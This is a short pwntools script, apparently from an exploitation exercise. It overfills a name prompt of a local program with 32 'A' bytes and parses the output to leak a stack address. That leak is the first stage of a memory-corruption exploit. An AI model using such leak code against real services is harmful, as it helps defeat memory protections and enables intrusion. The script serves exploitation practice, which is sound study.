from pwn import *

p = process('./../bin/program-2')

p.recv(len('Input your name --> '))
p.send('A'*32)
data = p.recv(0x100)
print('Stack addr: 0x' + str(data.hex()).split('41'*32)[1][:12])
